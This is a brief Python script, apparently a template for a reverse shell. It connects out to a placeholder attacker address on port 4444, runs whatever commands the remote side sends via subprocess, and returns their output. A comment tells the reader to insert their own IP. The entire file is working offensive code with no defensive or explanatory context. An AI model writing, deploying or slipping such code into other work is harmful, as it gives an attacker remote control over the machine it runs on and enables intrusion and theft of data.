import socket
import subprocess

# Connect to attacker's server
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("ATTACKER_IP", 4444))  # Replace with YOUR IP!

# Execute commands sent by the attacker
while True:
    command = client.recv(4096).decode()
    if command.lower() == "exit":
        break
    # Run the command and send back the output
    output = subprocess.getoutput(command)
    client.send(output.encode())
